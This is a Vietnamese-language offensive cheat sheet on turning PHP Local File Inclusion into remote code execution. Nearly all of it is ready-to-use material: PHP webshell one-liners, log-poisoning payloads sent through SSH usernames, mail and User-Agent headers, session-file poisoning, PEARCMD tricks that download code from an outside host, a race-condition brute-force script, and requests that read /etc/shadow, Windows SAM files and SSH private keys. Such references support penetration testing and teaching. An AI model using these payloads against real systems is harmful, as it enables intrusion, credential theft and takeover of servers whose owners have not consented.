# LFI to RCE (Từ LFI đến RCE)

> LFI (Local File Inclusion) là một lỗ hổng xảy ra khi một ứng dụng web nhúng (include) các tệp từ hệ thống tệp cục bộ, thường là do xử lý đầu vào của người dùng không an toàn. Nếu kẻ tấn công có thể kiểm soát đường dẫn tệp, chúng có thể nhúng các tệp nhạy cảm hoặc nguy hiểm như tệp hệ thống (/etc/passwd), tệp cấu hình, hoặc thậm chí là các tệp độc hại có thể dẫn đến Remote Code Execution (RCE).

## Tóm tắt

- [LFI to RCE via /proc/*/fd](#lfi-to-rce-via-procfd)
- [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-procselfenviron)
- [LFI to RCE via iconv](#lfi-to-rce-via-iconv)
- [LFI to RCE via upload](#lfi-to-rce-via-upload)
- [LFI to RCE via upload (race)](#lfi-to-rce-via-upload-race)
- [LFI to RCE via upload (FindFirstFile)](#lfi-to-rce-via-upload-findfirstfile)
- [LFI to RCE via phpinfo()](#lfi-to-rce-via-phpinfo)
- [LFI to RCE via controlled log file](#lfi-to-rce-via-controlled-log-file)
    - [RCE via SSH](#rce-via-ssh)
    - [RCE via Mail](#rce-via-mail)
    - [RCE via Apache logs](#rce-via-apache-logs)
- [LFI to RCE via PHP sessions](#lfi-to-rce-via-php-sessions)
- [LFI to RCE via PHP PEARCMD](#lfi-to-rce-via-php-pearcmd)
- [LFI to RCE via Credentials Files](#lfi-to-rce-via-credentials-files)

## LFI to RCE via /proc/*/fd

1. Tải lên nhiều webshell (ví dụ: 100 shell)
2. Nhúng (include) `/proc/$PID/fd/$FD` trong đó `$PID` là PID của tiến trình và `$FD` là filedescriptor. Cả hai giá trị này đều có thể được dò tìm bằng bruteforce.

```ps1
http://example.com/index.php?page=/proc/$PID/fd/$FD
```

## LFI to RCE via /proc/self/environ

Giống như một tệp log, gửi payload trong header `User-Agent`, nó sẽ được phản chiếu bên trong tệp `/proc/self/environ`

```powershell
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

## LFI to RCE via iconv

Sử dụng iconv wrapper để kích hoạt lỗi OOB trong glibc (CVE-2024-2961), sau đó sử dụng LFI của bạn để đọc các vùng bộ nhớ từ `/proc/self/maps` và tải xuống binary của glibc. Cuối cùng bạn đạt được RCE bằng cách khai thác cấu trúc `zend_mm_heap` để gọi một `free()` đã được ánh xạ lại thành `system` bằng cách sử dụng `custom_heap._free`.

**Yêu cầu**:

- PHP 7.0.0 (2015) đến 8.3.7 (2024)
- GNU C Library (`glibc`) <=  2.39
- Có quyền truy cập vào các filter `convert.iconv`, `zlib.inflate`, `dechunk`

**Khai thác**:

- [ambionics/cnext-exploits](https://github.com/ambionics/cnext-exploits/tree/main)

## LFI to RCE via upload

Nếu bạn có thể tải tệp lên, chỉ cần chèn payload webshell vào trong đó (ví dụ: `<?php system($_GET['c']); ?>` ).

```powershell
http://example.com/index.php?page=path/to/uploaded/file.png
```

Để giữ cho tệp có thể đọc được, tốt nhất nên chèn vào phần metadata của hình ảnh/tài liệu/pdf

## LFI to RCE via upload (race)

- Tải lên một tệp và kích hoạt việc tự nhúng (self-inclusion).
- Lặp lại việc tải lên rất nhiều lần để:
- tăng cơ hội thắng cuộc đua (race)
- tăng khả năng đoán đúng
- Bruteforce việc nhúng tệp /tmp/[0-9a-zA-Z]{6}
- Tận hưởng shell của bạn.

```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')
```

## LFI to RCE via upload (FindFirstFile)

:warning: Chỉ hoạt động trên Windows

`FindFirstFile` cho phép sử dụng mask (`<<` thay cho `*` và `>` thay cho `?`) trong các đường dẫn LFI trên Windows. Mask về cơ bản là một mẫu tìm kiếm có thể chứa các ký tự đại diện (wildcard), cho phép người dùng hoặc nhà phát triển tìm kiếm tệp hoặc thư mục dựa trên tên hoặc loại từng phần. Trong ngữ cảnh của FindFirstFile, mask được dùng để lọc và khớp tên của tệp hoặc thư mục.

- `*`/`<<` : Đại diện cho một chuỗi ký tự bất kỳ.
- `?`/`>` : Đại diện cho một ký tự đơn bất kỳ.

Tải lên một tệp, nó sẽ được lưu trong thư mục temp `C:\Windows\Temp\` với một tên được sinh ra ngẫu nhiên như `php[A-F0-9]{4}.tmp`.
Sau đó, hoặc bruteforce 65536 tên tệp có thể có, hoặc sử dụng ký tự đại diện như: `http://site/vuln.php?inc=c:\windows\temp\php<<`

## LFI to RCE via phpinfo()

PHPinfo() hiển thị nội dung của bất kỳ biến nào như **$_GET**, **$_POST** và **$_FILES**.

> Bằng cách thực hiện nhiều request tải lên (upload) tới script PHPInfo, và kiểm soát cẩn thận các lần đọc, có thể lấy được tên của tệp tạm thời và thực hiện request tới script LFI với tên tệp tạm thời đó.

Sử dụng script [phpInfoLFI.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

## LFI to RCE via controlled log file

Chỉ cần chèn thêm mã PHP của bạn vào tệp log bằng cách gửi một request đến dịch vụ (Apache, SSH..) rồi nhúng (include) tệp log đó.

```powershell
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/apache2/access.log
http://example.com/index.php?page=/var/log/apache2/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

### RCE via SSH

Thử ssh vào máy chủ với một đoạn mã PHP làm tên đăng nhập `<?php system($_GET["cmd"]);?>`.

```powershell
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
```

Sau đó nhúng (include) các tệp log SSH bên trong ứng dụng web.

```powershell
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```

### RCE via Mail

Đầu tiên gửi một email bằng SMTP mở, sau đó nhúng (include) tệp log nằm tại `http://example.com/index.php?page=/var/log/mail`.

```powershell
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

Trong một số trường hợp, bạn cũng có thể gửi email bằng lệnh dòng lệnh `mail`.

```powershell
mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
```

### RCE via Apache logs

Đầu độc User-Agent trong access log:

```ps1
curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
```

Lưu ý: Các log sẽ escape dấu ngoặc kép nên hãy sử dụng dấu nháy đơn cho các chuỗi trong payload PHP.

Sau đó yêu cầu (request) các log thông qua LFI và thực thi lệnh của bạn.

```ps1
curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
```

## LFI to RCE via PHP sessions

Kiểm tra xem website có sử dụng PHP Session (PHPSESSID) hay không

```javascript
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

Trong PHP, các session này được lưu trữ vào các tệp /var/lib/php5/sess_[PHPSESSID] hoặc /var/lib/php/sessions/sess_[PHPSESSID]

```javascript
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```

Đặt cookie thành `<?php system('cat /etc/passwd');?>`

```powershell
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```

Sử dụng LFI để nhúng (include) tệp session PHP

```powershell
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```

## LFI to RCE via PHP PEARCMD

PEAR là một framework và hệ thống phân phối cho các thành phần PHP có thể tái sử dụng. Theo mặc định, `pearcmd.php` được cài đặt trong mọi Docker PHP image từ [hub.docker.com](https://hub.docker.com/_/php) tại `/usr/local/lib/php/pearcmd.php`.

Tệp `pearcmd.php` sử dụng `$_SERVER['argv']` để lấy các tham số của nó. Chỉ thị `register_argc_argv` phải được đặt thành `On` trong cấu hình PHP (`php.ini`) để cuộc tấn công này có thể thực hiện được.

```ini
register_argc_argv = On
```

Có những cách sau đây để khai thác nó.

- **Phương pháp 1**: config create

  ```ps1
  /vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php
  /vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();
  ```

- **Phương pháp 2**: man_dir

  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+
  /vuln.php?file=/tmp/exec.php&c=id
  ```

  Tệp cấu hình được tạo ra chứa webshell.

  ```php
  #PEAR_Config 0.9
  a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"man_dir";s:29:"<?echo(system($_GET['c']));?>";}
  ```

- **Phương pháp 3**: download (cần có kết nối mạng ra ngoài).

  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://<ip>:<port>/exec.php
  /vuln.php?file=exec.php&c=id
  ```

- **Phương pháp 4**: install (cần có kết nối mạng ra ngoài). Lưu ý rằng `exec.php` nằm tại `/tmp/pear/download/exec.php`.

  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php
  /vuln.php?file=/tmp/pear/download/exec.php&c=id
  ```

## LFI to RCE via credentials files

Phương pháp này yêu cầu đặc quyền cao bên trong ứng dụng để có thể đọc các tệp nhạy cảm.

### Phiên bản Windows

Trích xuất các tệp `sam` và `system`.

```powershell
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
```

Sau đó trích xuất hash từ các tệp này bằng `samdump2 SYSTEM SAM > hashes.txt`, và crack chúng bằng `hashcat/john` hoặc replay chúng bằng kỹ thuật Pass The Hash.

### Phiên bản Linux

Trích xuất tệp `/etc/shadow`.

```powershell
http://example.com/index.php?page=../../../../../../etc/shadow
```

Sau đó crack các hash bên trong để có thể đăng nhập qua SSH vào máy.

Một cách khác để có được quyền truy cập SSH vào máy Linux thông qua LFI là đọc tệp private SSH key: `id_rsa`.
Nếu SSH đang hoạt động, kiểm tra xem user nào đang được sử dụng trên máy bằng cách nhúng (include) nội dung của `/etc/passwd` và thử truy cập `/<HOME>/.ssh/id_rsa` cho mỗi user có thư mục home.

## Tài liệu tham khảo

- [LFI WITH PHPINFO() ASSISTANCE - Brett Moore - April 6, 2017](https://web.archive.org/web/20170406225317/https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)
- [LFI2RCE via PHP Filters - HackTricks - July 19, 2024](https://web.archive.org/web/20220819000915/https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
- [Local file inclusion tricks - Johan Adriaans - August 4, 2007](https://web.archive.org/web/20250403080651/http://devels-playground.blogspot.fr/2007/08/local-file-inclusion-tricks.html)
- [PHP LFI to arbitrary code execution via rfc1867 file upload temporary files (EN) - Gynvael Coldwind - March 18, 2011](https://web.archive.org/web/20110429042455/http://gynvael.coldwind.pl:80/?id=376)
- [PHP LFI with Nginx Assistance - Bruno Bierbaumer - December 26, 2021](https://web.archive.org/web/20250604035904/https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)
- [Upgrade from LFI to RCE via PHP Sessions - Reiners - September 14, 2017](https://web.archive.org/web/20170914211708/https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/)
